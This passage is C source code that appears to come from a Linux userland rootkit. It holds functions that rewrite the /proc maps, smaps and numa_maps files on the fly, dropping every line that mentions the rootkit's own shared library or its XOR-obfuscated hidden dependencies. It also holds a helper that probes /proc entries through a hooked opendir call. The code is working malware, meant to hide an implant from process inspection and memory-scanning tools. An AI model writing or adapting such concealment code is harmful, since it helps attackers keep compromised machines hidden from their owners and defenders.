char *badstring(const char *buf, const bdvso_t *so){
    char *ret = NULL;
    size_t badsize = sizeofarr(bads);
#ifdef NO_HIDE_DEPENDENCIES
    badsize = 1;
#endif
    for(size_t i=0; i<badsize && !ret; i++){
        char *bad = xordup(bads[i]);
        if(!bad) continue;
        ret = strstr(buf, bad);
        clean(bad);
    }
    !ret ? ret = strstr(buf, so->sopath) : 0;
    return ret;
}

int procexists(const char *pathname){  /* prevents segfault on attempts to read a maps within nonexistent proc entry */
    char *pathdup, *pathdir;
    int exists = 0;
    DIR *dp;
    hook(COPENDIR);
    pathdup = strdup(pathname);
    if(!pathdup) return 0;
    pathdir = dirname(pathdup);
    dp = call(COPENDIR, pathdir);
    clean(pathdup);
    if(dp != NULL){
        closedir(dp);
        exists = 1;
    }
    return exists;
}

FILE *forge_maps(const char *pathname){
    FILE *tmp, *fp;
    char buf[LINE_MAX];
    bdvso_t *so;

    if((fp = redirstream(pathname, &tmp)) == NULL){
        errno = ENOENT;
        return NULL;
    }else if((so = getbdvsoinf()) == NULL){
        fclose(tmp);
        return fp;
    }

    while(fgets(buf, sizeof(buf), fp) != NULL){
        if(!badstring(buf, so)){
            fputs(buf, tmp);
            fflush(tmp);
        }
    }

    sree(so);
    fclose(fp);
    rewind(tmp);
    return tmp;
}

FILE *forge_smaps(const char *pathname){
    FILE *tmp, *fp;
    char buf[LINE_MAX];
    int i = 0;
    bdvso_t *so;

    if((fp = redirstream(pathname, &tmp)) == NULL){
        errno = ENOENT;
        return NULL;
    }else if((so = getbdvsoinf()) == NULL){
        fclose(tmp);
        return fp;
    }

    while(fgets(buf, sizeof(buf), fp) != NULL){
        if(i > 0) i++;
        if(i > 15) i = 0;
        if(badstring(buf, so)) i = 1;
        if(i == 0){
            fputs(buf, tmp);
            fflush(tmp);
        }
    }

    sree(so);
    fclose(fp);
    rewind(tmp);
    return tmp;
}

FILE *forge_numamaps(const char *pathname){
    FILE *tmp, *fp;
    char buf[LINE_MAX];
    bdvso_t *so;

    if((fp = redirstream(pathname, &tmp)) == NULL){
        errno = ENOENT;
        return NULL;
    }else if((so = getbdvsoinf()) == NULL){
        fclose(tmp);
        return fp;
    }

    while(fgets(buf, sizeof(buf), fp) != NULL){
        if(!badstring(buf, so)){
            fputs(buf, tmp);
            fflush(tmp);
        }
    }

    sree(so);
    fclose(fp);
    rewind(tmp);
    return tmp;
}
